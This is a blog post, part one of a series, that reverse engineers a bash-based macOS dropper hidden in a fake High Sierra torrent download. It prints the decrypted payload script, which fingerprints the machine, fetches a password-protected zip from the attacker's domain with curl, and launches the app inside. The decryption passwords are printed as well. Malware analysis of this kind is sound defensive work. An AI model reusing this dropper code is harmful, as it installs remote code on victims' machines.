<!DOCTYPE html>
<html lang="en">

  <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  

  <title>
    
      Malware Analaysis on macOS, Part 1: Bash &middot; xfbs:blog
    
  </title>

  <!-- Style -->
  <link rel="stylesheet" href="/assets/main.css">
  <!-- <link href="https://fonts.googleapis.com/css?family=Vollkorn|Vollkorn+SC" rel="stylesheet"> -->

  <!-- MathJaX
    Disabled for now. I will at some point render it server-side or self-host.
  -->
  <!--<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-AMS-MML_HTMLorMML' async></script>-->

  <!-- Favicon -->
  <link rel="shortcut icon" href="/favicon.ico">
  <link rel="icon" type="image/svg+xml" size="any" href="/assets/favicon.svg">
  <link rel="icon" type="image/png" sizes="96x96" href="/assets/favicon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon.png">
  <link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png">

  <!-- RSS -->
  <link type="application/atom+xml" rel="alternate" href="https://blog.xfbs.net/feed.xml" title="xfbs:blog" />
</head>


  <body>
    <nav class="nav">
      <div class="nav-container">
        <a href="/">
          <h2 class="nav-title">xfbs:blog</h2>
        </a>
        <ul>
          <li><a href="/about">About</a></li>
          <li><a href="/links">Links</a></li>
          <li><a href="/">Posts</a></li>
        </ul>
      </div>
    </nav>

    <main>
      <div class="post">
  <div class="post-info">
    
      <br>
      <time datetime="2019-06-17 00:00:00 +0200">June 17, 2019</time>
    
  </div>
  <h1 class="post-title">Malware Analaysis on macOS, Part 1: Bash</h1>
  <div class="post-line"></div>

  <p><em>This is part one of a multi-part series where I reverse engineer some shitty macOS malware. All the code is available <a href="https://gist.github.com/xfbs/42df932fadaeb0f3888230e6ec1b0a99">here</a>.</em></p>

<p>I didn’t even know there was malware for macOS out there. I mean, I knew it existed, I just didn’t think I’d ever encounter any. These days with all the fancy package managers (homebrew) and App Stores, it’s extremely rare that one has to download software from the scary internet. But today was such a case, at least, in a way.</p>

<p>I have this old 2010 Mac Mini that I still use for a couple of things. And for some reason, I wanted to wipe it clean and reinstall macOS on it. It doesn’t support the latest version of macOS, 10.14 Mojave, but it does still run 10.13 High Sierra.</p>

<p>The normal way to do this is to download macOS from the App Store. That way it’s directly from Apple, the download is verified and it’s all good. However, the download from Apple isn’t the fastest, I only got around 1 MB/s from them, which is far less than my connection should max out that.</p>

<p>So I went into the wild, wild internet and tried to find a torrent for it. That would be a much faster way of downloading High Sierra. So I managed to find a website that offered to download macOS High Sierra 10.13.6, exactly what I was looking for, and so promptly downloaded it.</p>

<p><img src="/assets/images/mac-torrents-malware.png" alt="Phony website hosting malware" /></p>

<p>But of course, you can’t trust the internet. Instead of a <code class="highlighter-rouge">.torrent</code> file, I go a <code class="highlighter-rouge">.dmg</code> that was only around 500 kB. That can’t be right! Normally I would just delete whatever they gave me and go back to Apple’s safe but slightly slower download. But because we are professionals and this is the first time I have encountered macOS malware in the wild, I thought it might be fun to see what I got there, to reverse it a bit.</p>

<p>The first thing I looked at is the download URL on that website.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://cdndownloadjspr.com/dl/?z=6120&amp;name=macOS%20High%20Sierra%2010.13.6%20-17G65-&amp;file=https://mac-torrents.io/wp-content/uploads/2018/07/macOS_10.13.6_High_Sierra.torrent
</code></pre></div></div>

<p>Now, interestingly, you can see that this is on another domain, <code class="highlighter-rouge">cdndownloadjspr.com</code>, which seems to be some sort of a CDN. Embedded in that is a URL going to <code class="highlighter-rouge">mac-torrents.io</code>. If you download that URL, you actually get a valid torrent file:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget "https://mac-torrents.io/wp-content/uploads/2018/07/macOS_10.13.6_High_Sierra.torrent"
$ sha256sum macOS_10.13.6_High_Sierra.torrent
fa1514a3a009471621db9986abd1e6df44bb9d7383f1be4e0b4ab628ae0f01db  macOS_10.13.6_High_Sierra.torrent
$ torrentcheck -t *.torrent
Torrent file  : macOS_10.13.6_High_Sierra.torrent
Metadata info : 50614 bytes, 2488 pieces, 2097152 bytes per piece
Torrent name  : macOS_10.13.6_High_Sierra.rar
Content info  : single file, 5217375346 bytes
Announce URL  : udp://tracker.leechers-paradise.org:6969
</code></pre></div></div>

<p>Those 5217375346 bytes that it reports is about 4.8 GB, which does check out. It might not be authentic, so I wouldn’t trust it, but it does seem more likely to actually be something.</p>

<p>If you don’t extract that URL, and use the URL of the CDN, then all bets are off. Every time you download it, you get something different. These are all the files I got from downloading the allaged torrent file (I have renamed some of them):</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sha256sum *
829500e88bd4b19b0f3562eba6a00f0065379b354ac408b79685ca9fe25aa064  macOS High Sierra 10.13.6 -17G65--2.dmg
8e85ebf5b34fa8285d182602dbad02dfe91cf0f6f68e87e86796a6090c2092d9  macOS High Sierra 10.13.6 -17G65--3.dmg
9dfc172e9f09a27af6ea9b95d434482502d602c393718f27ffe97d7e26e58eb9  macOS High Sierra 10.13.6 -17G65--4.dmg
ddcf71302cac7ef9fd80ce754a8c1b138534dfd7bf13a728091014960422a836  macOS High Sierra 10.13.6 -17G65--5.dmg
2bbf214ee6f289e6e93970cc46562e93fdf7236b5c55c0c1b6e0f2151d57e04f  macOS High Sierra 10.13.6 -17G65-.dmg
c9e2a57741c4117b59c4cd3a30167a564fde76795df7f4b3682bef283fae54f9  macOS_10.13.6_High_Sierra.dmg
cc716c1da4be1d03130b59453b5f8f668c07b96cf1a1fde0f0b920c952133428  macOS_10_13_6_High_Sierra.dmg
faf600fd75c8aafe3dd1a0c12e4970003f771d707e4bfd0226a7fc5da2f21423  macOS_High_Sierra.dmg
c9e2a57741c4117b59c4cd3a30167a564fde76795df7f4b3682bef283fae54f9  macos_installer_malware.dmg
8cd90a110eabaa7dd51d912bfb6fc896ed4c002b83e992c7822a71649f3b4911  malware.dmg
</code></pre></div></div>

<p>I’m not sure if it’s <code class="highlighter-rouge">mac-torrents.io</code> that is malicious, or if it’s the CDN that is malicious. Another clue is that <code class="highlighter-rouge">mac-torrents.io</code> seems to be running WordPress, which is infamous for security holes. So it’s not quite clear who is the bad actor here.</p>

<p>As for the different checksums on every download, it does seem like they serve different types of malware on every downlod. But it might also be that they slightly randomize each download to evade detection by virus scanners that only check the hashes of files.</p>

<p>I chose one of these <code class="highlighter-rouge">.dmg</code> files and mounted them. It looks like this:</p>

<p><img src="/assets/images/malware-installer.png" alt="Malware installer" /></p>

<p>All of these are perfectly valid DiskImage files. If you don’t know macOS, DiskImage files are like a hybrid between a ZIP file and a virtual CD, in that they are compressed, and you have to “mount” them. They are also read-only and typically used to distribute software.</p>

<p>All of these <code class="highlighter-rouge">.dmg</code> files are either 500 kB or 1.5 MB in size, which suggests that there are different versions or different payloads here. Some of them don’t have an “Installer” but a “Player” icon that looks like the Adobe Flash Player that is now obsolete but used to be quite important on the internet.</p>

<p>Since this is a proper macOS app, we can check if the code is signed with Apple’s <code class="highlighter-rouge">codesign</code> utility, and if so, which certificate was used to sign it. MacOS doesn’t like running code that isn’t signed, which is quite good.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ codesign -dvv Installer.app/
Executable=/Volumes/Installer/Installer.app/Contents/MacOS/lkyuqiwjiavtbfmjckxz
Identifier=com.lkyuqiwjiavtbfmjckxz
Format=app bundle with generic
CodeDirectory v=20200 size=216 flags=0x0(none) hashes=1+3 location=embedded
Signature size=9014
Authority=Developer ID Application: Edward Furlhoper (XL8ZVTY2W2)
Authority=Developer ID Certification Authority
Authority=Apple Root CA
Timestamp=10. Jun 2019 at 12:29:18
Info.plist entries=12
TeamIdentifier=XL8ZVTY2W2
Sealed Resources version=2 rules=13 files=2
Internal requirements count=2 size=236
</code></pre></div></div>

<p>As expected, this app is signed. It has the nonsensical identifier <code class="highlighter-rouge">com.lkyuqiwjiavtbfmjckxz</code>, and is signed by an <em>Edward Furlhoper</em>. A simple search shows that this name is <a href="https://blog.cyberbyte.org/blog/new-macos-malware-with-command-control-capabilities-disguised-as-cill-tab-adware/">not unknown</a>, and this particular individual has been linked to other malware.</p>

<p>That still doesn’t tell us what this thing actually does. To find that out, we need to actually inspect the code that it is running. So, I just naïvely opened it in <code class="highlighter-rouge">vim</code>, and well, hello there..</p>

<p><img src="/assets/images/malware-vim.png" alt="Malware bash script" /></p>

<p>Turns out it’s just a <code class="highlighter-rouge">bash</code> script. That’s interesting, I guess I would have expected something.. sophisticated. But it does make sense, if you’re going to write malware for a system, you want to do it as cheaply as possible, so you’ll use whatever comes preinstalled. And writing a little bash script works because macOS comes with <code class="highlighter-rouge">bash</code> and <code class="highlighter-rouge">openssl</code> preinstalled. But what does this thing even do?</p>

<p>You can see that it finds the parent directory of the directory where it’s stored in (it’s in <code class="highlighter-rouge">Installer.app/Contents/MacOS/</code>, so <code class="highlighter-rouge">fileDir</code> will contain <code class="highlighter-rouge">Installer.app/Contents</code>). It then loads a file, <code class="highlighter-rouge">Installer.app/Contents/Resources/enc</code>, which it decrypts and evaluates. To see what it’s evaluating there, we can just decrypt that file as well and inspect it.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ openssl enc -base64 -d -aes-256-cbc -nosalt -pass pass:2822812613 &lt; Installer.app/Contents/Resources/enc &gt; stage_two.sh
$ sha256sum stage_two.sh
7b05f80cd95d5aa2c84a47f59e26cf2f5faf8b84661a06f0e8c5cc3094b215ee  /Users/pelsen/malware.sh
</code></pre></div></div>

<p>The result of decrypting the file is, unsurprisingly, another bash script.</p>

<p><img src="/assets/images/malware-decrypted.png" alt="Malware decrypted script" /></p>

<p>This code is obfuscated, but in such a trivial way that we can easily decode it. Very obvious are the two variables, <code class="highlighter-rouge">_y</code> and <code class="highlighter-rouge">_t</code>. These are a key and some data (interestingly, the same key as the one this file was encrypted with). The functions <code class="highlighter-rouge">_m</code> and <code class="highlighter-rouge">_l</code> use these variables to decrypt something, a third bash script, which is then evaluated.</p>

<p>I went through the code to deobfuscate it, sprinkle some comments into it and I was able to learn some things on the way. For example, <code class="highlighter-rouge">${#1}</code> is <code class="highlighter-rouge">bash</code> syntax for getting the length of the string variable <code class="highlighter-rouge">$1</code>. The deobfuscated version is available <a href="https://gist.github.com/xfbs/42df932fadaeb0f3888230e6ec1b0a99#file-macos_malware_deobfuscated-sh">here</a>.</p>

<p><img src="/assets/images/malware-deobfuscated.png" alt="Malware deobfuscated" /></p>

<p>You can see that they implemented some pseudo-encryption using XOR. If you didn’t know, you can parse hex numbers and perform XOR operations on them with a syntax similar to this:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="k">$((</span> <span class="o">((</span><span class="m">0</span>xa1<span class="k">))</span> ^ <span class="o">((</span>0x1a<span class="o">))</span> <span class="o">))</span>
</code></pre></div></div>

<p>This pseudo-encryption is pretty shit, and trivial to deobfuscate. But things like this are also wildly popular because they are so easy to implement. The fact that it’s implemented in bash does make it look a bit wild.</p>

<p>Now that we know what it does, we could go through it and follow the code to manually do what it does,to decrypt the data. Or, we can just change the <code class="highlighter-rouge">eval</code> into an <code class="highlighter-rouge">echo</code> and run the script, and let it decode itself. Note that this is sometimes dangerous, because if you made a mistake, you could inadvertendly infect your system with malware. So, it’s probably best to do this in a container or a throwaway VM. I just set up a docker container, created an unprivileged user in it, downloaded</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker run -it ubuntu /bin/bash
# adduser user
# su user
$ sed -i -e 's/eval/echo/g' stage_two.sh
$ chmod +x stage_two.sh
$ ./stage_two.sh &gt; stage_three.sh
</code></pre></div></div>

<p>So, running all that, we get to the next stage, stage three. This one isn’t even obfuscated at all, it’s just a script that seems to download something from the net and execute it. It is available <a href="https://gist.github.com/xfbs/42df932fadaeb0f3888230e6ec1b0a99#file-macos_malware_payload-sh">here</a>.</p>

<p><img src="/assets/images/macos-malware-payload.png" alt="MacOS malware payload" /></p>

<p>This looks like it’s getting somewhere fun. Interestingly, the password is still the same, they used <code class="highlighter-rouge">2822812613</code> as the password at every stage. We can go through these variables they are setting, to find out what kind of information is passed on to their server, and download whatever their server gives us.</p>

<p>The first couple variables are just some parameters. The encryption password, which might be used to identify this particular version of the malware, or it might even be generated randomly and be able to track an individual machine.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ENC_PASS="2822812613"
APP_DOMAIN="www.evyet.pw"
APP_ROUTE="download/dlst"
unzip_password="316218228228228126133456789"
</code></pre></div></div>

<p>Next are some data about the OS that it saves into the variables <code class="highlighter-rouge">os_version</code>, <code class="highlighter-rouge">session_guid</code> and <code class="highlighter-rouge">machine_id</code>. That includes the version of macOS you are using, a randomly generated ID and some type of ID to identify the machine. I don’t know if the <code class="highlighter-rouge">machine_id</code> identifies the <em>model</em> or the particular machine you’re on. I have executed these commands locally to show you what the output looks like. I did censor my <code class="highlighter-rouge">machine_id</code> because I’m not sure if it can be used to track my specific hardware, but the output looks exactly like a UUID.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sw_vers -productVersion
10.14.5
$ uuidgen
769F2AAE-47D3-4EF4-BB6E-64B6742F3662
$ ioreg -rd1 ioreg -rd1 -c IOPlatformExpertDevice | grep -o '"IOPlatformUUID" = "\(.*\)"'
XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX
</code></pre></div></div>

<p>Next comes the interesting part. Here we actually download and execute whatever the server gives us.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">url</span><span class="o">=</span><span class="s2">"http://</span><span class="k">${</span><span class="nv">APP_DOMAIN</span><span class="k">}</span><span class="s2">/</span><span class="k">${</span><span class="nv">APP_ROUTE</span><span class="k">}</span><span class="s2">?mid=</span><span class="k">${</span><span class="nv">machine_id</span><span class="k">}</span><span class="s2">&amp;s=</span><span class="k">${</span><span class="nv">session_guid</span><span class="k">}</span><span class="s2">&amp;o=</span><span class="k">${</span><span class="nv">os_version</span><span class="k">}</span><span class="s2">&amp;p=</span><span class="k">${</span><span class="nv">ENC_PASS</span><span class="k">}</span><span class="s2">"</span>
<span class="nv">tmp_path</span><span class="o">=</span><span class="s2">"</span><span class="k">$(</span><span class="nb">mktemp</span> /tmp/XXXXXXXXX<span class="k">)</span><span class="s2">"</span>
curl <span class="nt">-f0L</span> <span class="s2">"</span><span class="k">${</span><span class="nv">url</span><span class="k">}</span><span class="s2">"</span> <span class="o">&gt;</span>/dev/null 2&gt;&amp;1 <span class="o">&gt;&gt;</span> <span class="k">${</span><span class="nv">tmp_path</span><span class="k">}</span> 
<span class="nv">app_dir</span><span class="o">=</span><span class="s2">"</span><span class="k">$(</span><span class="nb">mktemp</span> <span class="nt">-d</span> /tmp/XXXXXXXX<span class="k">)</span><span class="s2">/"</span> 
unzip <span class="nt">-P</span> <span class="s2">"</span><span class="k">${</span><span class="nv">unzip_password</span><span class="k">}</span><span class="s2">"</span> <span class="s2">"</span><span class="k">${</span><span class="nv">tmp_path</span><span class="k">}</span><span class="s2">"</span> <span class="nt">-d</span> <span class="s2">"</span><span class="k">${</span><span class="nv">app_dir</span><span class="k">}</span><span class="s2">"</span> <span class="o">&gt;</span> /dev/null 2&gt;&amp;1 
<span class="nb">rm</span> <span class="nt">-f</span> <span class="k">${</span><span class="nv">tmp_path</span><span class="k">}</span> 
<span class="nv">file_name</span><span class="o">=</span><span class="s2">"</span><span class="k">$(</span><span class="nb">grep</span> <span class="nt">-m1</span> <span class="nt">-v</span> <span class="s2">"*.app"</span> &lt;<span class="o">(</span><span class="nb">ls</span> <span class="nt">-1</span> <span class="s2">"</span><span class="k">${</span><span class="nv">app_dir</span><span class="k">}</span><span class="s2">"</span><span class="k">)</span><span class="s2">)"</span> 
<span class="nv">volume_name</span><span class="o">=</span><span class="s2">"</span><span class="k">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="k">${</span><span class="nv">PWD</span><span class="k">}</span><span class="s2">"</span> | <span class="nb">sed</span> <span class="nt">-E</span> <span class="nt">-n</span> <span class="s1">'s@^(/Volumes/[^/]+)/.*@\1@p'</span><span class="k">)</span><span class="s2">"</span> 
<span class="nv">volume_name</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">volume_name</span><span class="p">// /%20</span><span class="k">}</span><span class="s2">"</span> 
<span class="nb">chmod</span> +x <span class="s2">"</span><span class="k">${</span><span class="nv">app_dir</span><span class="k">}${</span><span class="nv">file_name</span><span class="k">}</span><span class="s2">/Contents/MacOS"</span>/<span class="k">*</span> 
open <span class="nt">-a</span> <span class="s2">"</span><span class="k">${</span><span class="nv">app_dir</span><span class="k">}${</span><span class="nv">file_name</span><span class="k">}</span><span class="s2">"</span> <span class="nt">--args</span> <span class="s2">"s"</span> <span class="s2">"</span><span class="k">${</span><span class="nv">session_guid</span><span class="k">}</span><span class="s2">"</span> <span class="s2">"</span><span class="k">${</span><span class="nv">volume_name</span><span class="k">}</span><span class="s2">"</span>
</code></pre></div></div>

<p>You can see that it builds a request URL <code class="highlighter-rouge">url</code>, it uses <code class="highlighter-rouge">curl</code> to download something from that URL into a temporary folder, next it unzips the file with the password it has, it finds an app that is contained in it and eventually launches that app with some arguments.</p>

<p>I ended up simply hardcoding some values for <code class="highlighter-rouge">os_version</code>, <code class="highlighter-rouge">session_guid</code> and <code class="highlighter-rouge">machine_id</code>, commenting out the lines after the unzip, and just running this stage again in the docker container.</p>

<p>So, I ended up just hardcoding some values into the script, and running it in a secure Linux container. Just to be safe.</p>

<p>Interestingly, every time I run the script, it downloads a different file.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>f47b360433f1f696c7d0edc0dcd274562d200baa36ff479b148eab5296684cbe  run1.zip
149f43daef9c4ac9ee17ffa108b392aa86fb230e128c6612583d52f47ea91af7  run2.zip
add0beb0535945ab85d3ffda97248975d8dff2ddb7560eefc19ee025f8f62b11  run3.zip
</code></pre></div></div>

<p>Are these all different malwares that it’s launching? Doesn’t seem like it. After unzipping them and comparing the unzipped files with diff, it’s clear that they all contain the same files.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ diff -r Installer.app Installer2.app
</code></pre></div></div>

<p>It’s most likely that the server generates these zip files on-demand and thus somewhere there are things with different different timestamps, which means they have a different hash sum despite containing the same files.</p>

<p>The timestamp on most of the files is June 10th, which is a bit more than a week ago at this point, so fairly recent.</p>

<p>Unlike the first <code class="highlighter-rouge">Installer.app</code> that we had, this one is not a bash script. But what does this <code class="highlighter-rouge">Installer.app</code> do? Check out the next post, where I will be reverse engineering the binary to find out what it does.</p>


</div>

<div class="pagination">
  
  
    <a href="/posts/tweaking-ffmpeg" class="right arrow">&#8594;</a>
  

  <a href="#" class="top">Top</a>
</div>

    </main>

    <footer>
      <span>
        <a href="/legal">Legal</a> &middot; 
        <a href="/privacy">Privacy</a> &middot; 
        Made with <a href="https://jekyllrb.com">Jekyll</a> using the <a href="https://github.com/chesterhow/tale/">Tale</a> theme &middot;
        <a href="https://creativecommons.org/licenses/by-sa/4.0/" title="Licensed under Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)">
          <img title="Creative Commons" src="/assets/images/cc-logo.svg" class="cc-icon" />
          <img title="Share" src="/assets/images/cc-sa.svg" class="cc-icon" />
          <img title="Adapt" src="/assets/images/cc-sa.svg" class="cc-icon" />
        </a>
      </span>
    </footer>
  </body>
</html>
